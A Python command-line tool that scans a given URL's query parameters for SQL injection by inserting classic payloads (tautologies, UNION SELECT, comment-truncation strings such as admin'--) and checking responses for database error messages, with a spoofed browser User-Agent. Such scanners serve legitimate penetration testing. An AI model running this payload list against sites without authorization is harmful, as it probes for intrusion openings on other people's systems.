#!/usr/bin/env python3
"""SQLi Scanner — detects basic SQL injection patterns in parameters."""
import argparse
import re
import sys
import time
from urllib.parse import urlparse, parse_qs, urlencode

import requests

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' GROUP BY 1--",
    "admin'--",
    "' OR EXISTS(SELECT * FROM users)--",
]

ERROR_SIGNATURES = [
    "sql syntax",
    "mysql_fetch",
    "ora-01756",
    "microsoft ole db provider for sql server",
    "postgresql error",
    "sqlite3.operationalerror",
    "you have an error in your sql syntax",
    "warning: mysql",
]


def extract_params(url: str) -> dict:
    parsed = urlparse(url)
    return parse_qs(parsed.query)


def test_sqli(url: str, param: str, payload: str) -> dict:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    test_url = parsed._replace(query=new_query).geturl()
    try:
        resp = requests.get(test_url, headers=HEADERS, timeout=15, allow_redirects=True)
        text_lower = resp.text.lower()
        error_found = any(sig in text_lower for sig in ERROR_SIGNATURES)
        return {
            "url": test_url,
            "param": param,
            "payload": payload,
            "status": resp.status_code,
            "length": len(resp.text),
            "error_signature": error_found,
        }
    except Exception as e:
        return {"url": test_url, "error": str(e)}


def scan_target(url: str, max_params: int = 10) -> list[dict]:
    params = extract_params(url)
    if not params:
        print(f"[!] No query parameters found in {url}")
        return []
    param_names = list(params.keys())[:max_params]
    print(f"[*] Scanning SQLi on {url}")
    print(f"[*] Parameters: {', '.join(param_names)}")
    results = []
    for param in param_names:
        for payload in SQLI_PAYLOADS:
            result = test_sqli(url, param, payload)
            results.append(result)
            if result.get("error_signature"):
                print(f"[POTENTIAL SQLi] {param} -> {payload[:40]}")
            time.sleep(0.2)
    return results


def main():
    parser = argparse.ArgumentParser(description="SQLi Scanner")
    parser.add_argument("url", help="Target URL with query parameters")
    parser.add_argument("--max-params", type=int, default=10)
    parser.add_argument("--output", default="reports/sqli_scan.jsonl")
    args = parser.parse_args()
    results = scan_target(args.url, args.max_params)
    hits = [r for r in results if r.get("error_signature")]
    print(f"\n[*] Scan complete. {len(hits)} potential SQLi issues out of {len(results)} tests.")
    if hits:
        print("[!] Review hits manually before reporting!")
    from pathlib import Path
    out = Path(args.output)
    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "a", encoding="utf-8") as f:
        for r in results:
            f.write(__import__("json").dumps(r, ensure_ascii=False) + "\n")
    print(f"[*] Results saved to {out}")


if __name__ == "__main__":
    main()
